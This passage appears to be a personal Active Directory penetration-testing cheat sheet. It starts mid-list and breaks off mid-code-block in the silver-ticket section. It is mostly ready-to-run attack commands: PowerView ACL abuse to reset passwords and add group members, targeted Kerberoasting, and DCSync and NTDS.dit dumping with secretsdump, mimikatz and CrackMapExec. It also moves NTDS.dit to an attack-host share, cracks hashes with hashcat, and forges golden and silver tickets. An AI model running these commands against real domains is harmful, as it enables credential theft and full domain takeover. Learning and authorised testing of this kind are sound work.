WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember</p>

<h3 id="enumerating-acls-with-bloodhound">Enumerating ACLs with BloodHound</h3>
<p>Next, we can set the <Username> user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights</Username></p>

<h3 id="enumerating-acls-with-powerview">Enumerating ACLs with PowerView</h3>
<h4 id="using-find-interestingdomainacl">Using Find-InterestingDomainAcl</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Find-InterestingDomainAcl</span><span class="w">
</span></code></pre></div></div>

<p>We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user’s SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.</p>

<p>Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.</p>

<h4 id="using-get-domainobjectacl">Using Get-DomainObjectACL</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$sid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Convert-NameToSid</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">USERNAME</span><span class="err">&gt;</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainObjectACL</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$sid</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<h4 id="performing-a-reverse-search--mapping-to-a-guid-value">Performing a Reverse Search &amp; Mapping to a GUID Value</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$guid</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;ObjectAceType&gt;"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"CN=Extended-Rights,</span><span class="si">$(</span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="o">.</span><span class="nf">ConfigurationNamingContext</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ObjectClass</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'ControlAccessRight'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">DisplayName</span><span class="p">,</span><span class="nx">DistinguishedName</span><span class="p">,</span><span class="nx">rightsGuid</span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">rightsGuid</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$guid</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></code></pre></div></div>

<h4 id="using-the--resolveguids-flag">Using the -ResolveGUIDs Flag</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainObjectACL</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$sid</span><span class="p">}</span><span class="w"> 
</span></code></pre></div></div>

<h4 id="creating-a-list-of-domain-users">Creating a List of Domain Users</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ad_users.txt</span><span class="w">
</span></code></pre></div></div>

<h4 id="a-useful-foreach-loop">A Useful foreach Loop</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
</code></pre></div></div>

<h4 id="further-enumeration-of-rights-using-damundsen">Further Enumeration of Rights Using damundsen</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; $sid2 = Convert-NameToSid damundsen
PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
</code></pre></div></div>

<h4 id="investigating-the-help-desk-level-1-group-with-get-domaingroup">Investigating the Help Desk Level 1 Group with Get-DomainGroup</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
</code></pre></div></div>

<h4 id="investigating-the-information-technology-group">Investigating the Information Technology Group</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; $itgroupsid = Convert-NameToSid "Information Technology"
PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
</code></pre></div></div>

<h4 id="looking-for-interesting-access">Looking for Interesting Access</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; $adunnsid = Convert-NameToSid adunn 
PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
</code></pre></div></div>

<hr />

<h2 id="acl-abuse-tactics">ACL Abuse Tactics</h2>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span></code></pre></div></div>

<h3 id="forcechangepassword">ForceChangePassword</h3>
<p>So, first, we must authenticate as <user1> because he can force change the password of the user <user2>. We can start by opening a PowerShell console and authenticating as the <user1> user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.</user1></user2></user1></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creating a PSCredential Object</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;PASSWORD HERE&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'&lt;INLANEFREIGHT&gt;\&lt;user1&gt;'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w"> 

</span><span class="c"># Creating a SecureString Object**</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$user2Password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Pwn3d_by_ACLs!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">

</span><span class="c"># Changing the User's Password</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">user2</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$user2Password</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div></div>
<p>We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the user1 that we control.</p>

<h3 id="add-domaingroupmember">Add-DomainGroupMember</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creating a SecureString Object using user2</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Pwn3d_by_ACLs!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'INLANEFREIGHT\user'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w"> 

</span><span class="c"># Adding user2 to the Help Desk Level 1 Group</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Help Desk Level 1'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'user2'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred2</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Help Desk Level 1"</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Members</span><span class="w">

</span><span class="c"># Confirming user2 was Added to the Group**</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Help Desk Level 1"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">MemberName</span><span class="w">
</span></code></pre></div></div>

<p>At this point, we should be able to leverage our new group membership to take control over the user3. Now, let’s say that our client permitted us to change the password of the user2, but the user3 is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account’s servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.</p>

<p>We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast [https://github.com/ShutdownRepo/targetedKerberoast] to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.</p>

<h3 id="creating-a-fake-spn">Creating a Fake SPN</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainObject</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred2</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">user3</span><span class="w"> </span><span class="nt">-SET</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'notahacker/LEGIT'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>targetedKerberoast.py <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;pass&gt;
</code></pre></div></div>

<h4 id="kerberoasting-with-rubeus">Kerberoasting with Rubeus</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; .\Rubeus.exe kerberoast /user:user3 /nowrap
</code></pre></div></div>

<h4 id="cleanup">Cleanup</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Removing the Fake SPN from user3's Account</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainObject</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred2</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">user3</span><span class="w"> </span><span class="nt">-Clear</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># Removing user2 from the Help Desk Level 1 Group</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Remove-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Help Desk Level 1"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'user2'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred2</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># Confirming user2 was Removed from the Group</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Help Desk Level 1"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">MemberName</span><span class="w"> </span><span class="o">|</span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">MemberName</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'user2'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div></div>

<hr />

<h2 id="dcsync">DCSync</h2>
<p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>

<p>The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p>

<p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>

<h3 id="using-get-domainuser-to-view-adunns-group-membership">Using Get-DomainUser to View adunn’s Group Membership</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
</code></pre></div></div>

<h3 id="using-get-objectacl-to-check-adunns-replication-rights">Using Get-ObjectAcl to Check adunn’s Replication Rights</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS &gt; Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
</code></pre></div></div>

<h3 id="extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy">Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>secretsdump.py <span class="nt">-outputfile</span> inlanefreight_hashes <span class="nt">-just-dc</span> INLANEFREIGHT/adunn@172.16.5.5 

<span class="c"># NTLM authentication</span>
<span class="nv">$ </span>secretsdump.py <span class="nt">-outputfile</span> inlanefreight_hashes &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt; 

<span class="c"># Hash authentication</span>
<span class="nv">$ </span>secretsdump.py <span class="nt">-outputfile</span> inlanefreight_hashes <span class="nt">-hash</span> &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt; 

<span class="c"># Kerberos authentication</span>
<span class="nv">$ </span>secretsdump.py <span class="nt">-outputfile</span> inlanefreight_hashes <span class="nt">-no-pass</span> <span class="nt">-k</span> &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt; 
</code></pre></div></div>
<p>We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</USERNAME></p>

<p>If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.</p>

<h3 id="using-runasexe">Using runas.exe</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; runas /netonly /user:INLANEFREIGHT\adunn powershell
</code></pre></div></div>

<h3 id="performing-the-attack-with-mimikatz">Performing the Attack with Mimikatz</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
</code></pre></div></div>

<hr />

<h1 id="domain-admin">Domain Admin</h1>
<h2 id="dump-ntdsdit">Dump NTDS.dit</h2>
<p>In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.</p>

<p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let’s consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p>

<p>Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.</p>

<hr />

<h2 id="capturing-ntdsdit">Capturing NTDS.dit</h2>
<p>NT Directory Services (NTDS) is the directory service used with AD to find &amp; organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module’s Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p>

<p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.</p>

<h3 id="checking-user-account-privileges-including-domain">Checking User Account Privileges including Domain</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">net user bwilliamson</code></li>
</ul>

<h3 id="creating-shadow-copy-of-c">Creating Shadow Copy of C:</h3>
<p>We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp; disaster recovery software to perform operations.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">vssadmin CREATE SHADOW /For=C:</code></li>
</ul>

<h4 id="copying-ntdsdit-from-the-vss">Copying NTDS.dit from the VSS</h4>
<p>We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code></li>
</ul>

<h4 id="transferring-ntdsdit-to-attack-host">Transferring NTDS.dit to Attack Host</h4>
<p>Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData</code></li>
</ul>

<h3 id="crackmapexec">CrackMapExec</h3>
<p>Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb 10.129.201.57 <span class="nt">-u</span> bwilliamson <span class="nt">-p</span> P@55w0rd! <span class="nt">--ntds</span>
</code></pre></div></div>

<h3 id="impacket">Impacket</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; 
</code></pre></div></div>

<h2 id="cracking-hashes--gaining-credentials">Cracking Hashes &amp; Gaining Credentials</h2>
<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li>
</ul>

<hr />

<h1 id="persistence">Persistence</h1>
<h2 id="goldticket">GoldTicket</h2>
<ul>
  <li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden</li>
  <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket</li>
</ul>

<h3 id="mimikatz-1">Mimikatz</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># with an NT hash</span><span class="w">
</span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nx">/sid:</span><span class="nv">$DomainSID</span><span class="w"> </span><span class="nx">/rc4:</span><span class="nv">$krbtgt_NThash</span><span class="w"> </span><span class="nx">/user:randomuser</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="c"># with an AES 128 key</span><span class="w">
</span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nx">/sid:</span><span class="nv">$DomainSID</span><span class="w"> </span><span class="nx">/aes128:</span><span class="nv">$krbtgt_aes128_key</span><span class="w"> </span><span class="nx">/user:randomuser</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="c"># with an AES 256 key</span><span class="w">
</span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nx">/sid:</span><span class="nv">$DomainSID</span><span class="w"> </span><span class="nx">/aes256:</span><span class="nv">$krbtgt_aes256_key</span><span class="w"> </span><span class="nx">/user:randomuser</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<h3 id="rubeus">Rubeus</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:ticket.kirbi
</code></pre></div></div>

<h3 id="remote">Remote</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; import-module .\PowerView.ps1
PS &gt; Get-DomainSID
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create the golden ticket (with an RC4 key, i.e. NT hash)</span>
<span class="nv">$ </span>ticketer.py <span class="nt">-nthash</span> <span class="nv">$krbtgtNThash</span> <span class="nt">-domain-sid</span> <span class="nv">$domainSID</span> <span class="nt">-domain</span> <span class="nv">$DOMAIN</span> randomuser

<span class="c"># Create the golden ticket (with an AES 128/256bits key)</span>
<span class="nv">$ </span>ticketer.py <span class="nt">-aesKey</span> <span class="nv">$krbtgtAESkey</span> <span class="nt">-domain-sid</span> <span class="nv">$domainSID</span> <span class="nt">-domain</span> <span class="nv">$DOMAIN</span> randomuser

<span class="c"># Set the ticket for impacket use</span>
<span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;TGS_ccache_file&gt;
</code></pre></div></div>

<hr />

<h2 id="silverticket">SilverTicket</h2>
<ul>
  <li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</li>
  <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</li>
</ul>

<p>The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It’s emphasized that using AES keys for forging tickets is more secure and less detectable.</p>

<h3 id="generate-the-rc4-hash-from-password">Generate the RC4 hash from password</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; mimikatz.exe
&gt; kerberos::hash /password:MyPassword
</code></pre></div></div>

<h3 id="mimikatz-2">Mimikatz</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># To generate the TGS with NTLM</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/sid:</span><span class="err">&lt;</span><span class="nx">domain_sid</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/rc4:</span><span class="err">&lt;</span><span class="nx">ntlm_hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/service:</span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/target:</span><span class="err">&lt;</span><span class="nx">service_machine_hostname</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># To generate the TGS with AES 128 key</span><span class="w">
